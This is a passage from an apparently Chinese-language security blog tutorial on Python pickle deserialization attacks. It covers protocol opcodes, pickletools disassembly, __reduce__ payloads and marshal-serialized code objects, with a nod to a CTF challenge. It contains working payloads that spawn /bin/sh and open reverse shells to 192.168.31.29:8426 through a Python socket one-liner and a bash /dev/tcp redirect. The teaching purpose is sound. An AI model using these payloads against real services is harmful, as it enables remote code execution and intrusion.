&lt;span style="color:#111">ver_4&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#8045ff">\x8c\x01&lt;/span>&lt;span style="color:#d88200">1&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01\x8c\x01&lt;/span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_5&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#8045ff">\x8c\x01&lt;/span>&lt;span style="color:#d88200">1&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01\x8c\x01&lt;/span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># python2输出 protocal&amp;lt;=2&lt;/span>
&lt;span style="color:#111">ver_0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dp0&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">p1&lt;/span>
&lt;span style="color:#111">I1&lt;/span>
&lt;span style="color:#111">sS&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;span style="color:#111">p2&lt;/span>
&lt;span style="color:#111">I2&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#111">ver_1&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#111">ver_2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">�&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>0号版本序列化的结果看起来可读性很强 都是可视的字符，操作码也比较直接地暴露出来，重点关注几个：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Opcode&lt;/th>
&lt;th>Mnemonic&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>(&lt;/td>
&lt;td>MARK&lt;/td>
&lt;td>Push a mark object onto the stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>S&lt;/td>
&lt;td>STRING&lt;/td>
&lt;td>string&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>I&lt;/td>
&lt;td>INT&lt;/td>
&lt;td>Push integer or bool; decimal string argument&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>l&lt;/td>
&lt;td>LIST&lt;/td>
&lt;td>build a list from topmost stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>d&lt;/td>
&lt;td>DICT&lt;/td>
&lt;td>build a dict from stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>}&lt;/td>
&lt;td>EMPTY_DICT&lt;/td>
&lt;td>Push empty dict&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>t&lt;/td>
&lt;td>TUPLE&lt;/td>
&lt;td>Build a tuple from topmost stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>)&lt;/td>
&lt;td>EMPTY_TUPLE&lt;/td>
&lt;td>Push empty tuple&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>c&lt;/td>
&lt;td>GLOBAL&lt;/td>
&lt;td>Push self.find_class(module, args); 2 string args&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>R&lt;/td>
&lt;td>REDUCE&lt;/td>
&lt;td>Apply callable to argtuple, both on stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>b&lt;/td>
&lt;td>BUILD&lt;/td>
&lt;td>call &lt;code>__setstate__&lt;/code> or &lt;code>__dict__.update()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>i&lt;/td>
&lt;td>INST&lt;/td>
&lt;td>build &amp;amp; push class instance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>o&lt;/td>
&lt;td>OBJ&lt;/td>
&lt;td>build &amp;amp; push class instance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.&lt;/td>
&lt;td>STOP&lt;/td>
&lt;td>Every pickle ends with STOP&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>使用**&lt;u>pickletools&lt;/u>**可以将opcode转化为肉眼可读取的形式&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickletools&lt;/span>
&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">cbuiltins&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">exec&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x13\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">key1=b&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">key2=b&amp;#39;2&amp;#39;q&lt;/span>&lt;span style="color:#8045ff">\x01\x85&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">Rq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>
&lt;span style="color:#111">pickletools&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dis&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> \&lt;span style="color:#111">x80&lt;/span> &lt;span style="color:#111">PROTO&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span> &lt;span style="color:#d88200">&amp;#39;builtins exec&amp;#39;&lt;/span>
&lt;span style="color:#ae81ff">17&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">X&lt;/span> &lt;span style="color:#111">BINUNICODE&lt;/span> &lt;span style="color:#d88200">&amp;#34;key1=b&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">key2=b&amp;#39;2&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#ae81ff">43&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#ae81ff">45&lt;/span>&lt;span style="color:#111">:&lt;/span> \&lt;span style="color:#111">x85&lt;/span> &lt;span style="color:#111">TUPLE1&lt;/span>
&lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#ae81ff">48&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">R&lt;/span> &lt;span style="color:#111">REDUCE&lt;/span>
&lt;span style="color:#ae81ff">49&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;span style="color:#ae81ff">51&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">STOP&lt;/span>
&lt;span style="color:#111">highest&lt;/span> &lt;span style="color:#111">protocol&lt;/span> &lt;span style="color:#111">among&lt;/span> &lt;span style="color:#111">opcodes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="可以利用的方向思路">可以利用的方向&amp;amp;思路&lt;/h2>
&lt;p>pickle的应用场景其实很广泛&lt;/p>
&lt;ul>
&lt;li>解析认证token, session时；参见：&lt;a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">掌阅iReader某站Python漏洞挖掘&lt;/a>（一个redis+python反序列化的栗子&lt;/li>
&lt;li>可能将对象pickle后存储成磁盘文件&lt;/li>
&lt;li>可能将对象pickle后在网络中传输&lt;/li>
&lt;li>可能会通过参数传递给程序；参见：&lt;a href="https://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/">sqlmap的代码执行漏洞&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>这里说一下第一点，flask配合redis在服务端存储session（以pickle序列化形式进行存储），如果通过cookie进行请求session_id时，session种的内容就会被反序列化。理论上没问题，但如果出现redis的未授权访问，就可以通过自己设计恶意的session，然后再设置cookie去请求session时，我们自定的内容就会被反序列化，达到了rce的目的。&lt;/p>
&lt;p>构造反序列化的payload离不开&lt;code>__reduce__&lt;/code>这个魔术方法（上文简单的提到过），它是新式类（内置类）特有的方法（关于更多python元类相关的知识可以参考stackoverflow的这篇帖子：&lt;a href="https://stackoverflow.com/questions/100003/what-are-metaclasses-in-python">What are metaclasses in Python?&lt;/a>）&lt;/p>
&lt;p>————在python2有两种声明类的方式，并且它们实例化的对象性质是不同的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005621153.png" alt="image-20210809005621153">&lt;/p>
&lt;p>python3中消除了两者的区别，表现为第二种&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005849080.png" alt="image-20210809005849080">&lt;/p>
&lt;p>回到关于&lt;code>__reduce__&lt;/code>的问题，只要在新式类中定义一个 &lt;code>__reduce__&lt;/code> 方法，我们就能在序列化的使用让这个类根据我们在&lt;code>__reduce__&lt;/code> 中指定的方式进行序列化。指定的关键就在于该方法的返回值上：一个&lt;code>callable&lt;/code>可调用的对象，一个是&lt;code> ([para1, para2, ...])[, ...])&lt;/code>，该对象所需的参数元组；最简单的例子是&lt;code>return (os.system, ('ls',))&lt;/code>。&lt;code>__reduce__&lt;/code> 方法与opcode中的R指令码关系密切，可以说PVM的R指令码就是&lt;code>__reduce__&lt;/code>的返回值的一个底层实现。&lt;/p>
&lt;h3 id="此处上一个简单的小栗子">此处上一个简单的小栗子&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># shell.pickle&lt;/span>
&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809002248690.png" alt="image-20210809002248690">&lt;/p>
&lt;p>上面手写的opcode成功返回了sh的shell；而通过dumps和loads实现则是这样；我们执行的代码都在&lt;code>__reduce__&lt;/code>中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">test&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">test&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809011024984.png" alt="image-20210809011024984">&lt;/p>
&lt;p>也顺利返回了shell，很容易发现跟上面手写的opcode并无差异，而这个核心就是构造时的&lt;code>__reduce__&lt;/code>函数的返回值，我们可以利用它来rce，反弹shell之类的。&lt;/p>
&lt;h3 id="另一个反弹shell的小栗子">另一个反弹shell的小栗子&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;python2 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;192.168.31.29&amp;#34;,8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 或者最简单的手写opcode 不用特意构造class A()&lt;/span>
&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809090941558.png" alt="image-20210809090941558">&lt;/p>
&lt;p>参考：&lt;a href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linux反弹shell（一）文件描述符与重定向&lt;/a> | &lt;a href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/">Linux 反弹shell（二）反弹shell的本质&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子1 - [DasCTF 0721] easyweb
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/#easyweb">之前写过了&lt;/a>，在对session的处理时使用了pickle，我们可以构造恶意的session反弹shell；也没有特殊的过滤和限制，payload怎么写都行&lt;/p>
&lt;/details>
&lt;h3 id="用marshal序列化任意代码对象">用Marshal序列化任意代码对象&lt;/h3>
&lt;p>如果只在&lt;code>__reduce__&lt;/code>中用&lt;code>-c&lt;/code>参数执行代码的话，遇到一些自定函数 在格式上就会比较麻烦&lt;/p>
&lt;p>前面提到pickle不能序列化代码对象，来个实例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;fib(10)=&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094914448.png" alt="image-20210809094914448">&lt;/p>
&lt;p>但也不是绝路一条，&lt;strong>Marshal&lt;/strong>可以让这段代码序列化&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;fib(10) =&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">code_serialized&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">code_serialized&lt;/span>
&lt;span style="color:#75715e"># YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B&lt;/span>
